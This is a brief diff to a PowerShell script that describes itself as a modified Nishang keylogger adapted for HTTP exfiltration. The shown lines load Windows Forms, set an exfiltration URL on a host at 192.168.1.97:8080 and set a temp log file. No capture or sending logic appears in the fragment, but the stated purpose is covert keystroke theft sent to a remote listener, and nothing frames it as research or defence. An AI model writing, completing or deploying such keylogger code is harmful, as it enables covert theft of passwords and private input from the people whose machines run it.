@@ -1,4 +1,5 @@
 # Based on Nishang Keylogger.ps1 - Modified for HTTP exfiltration
+Add-Type -AssemblyName System.Windows.Forms
 $url = "http://192.168.1.97:8080/log"
 $logFile = "$env:TEMP\kl.txt"
 
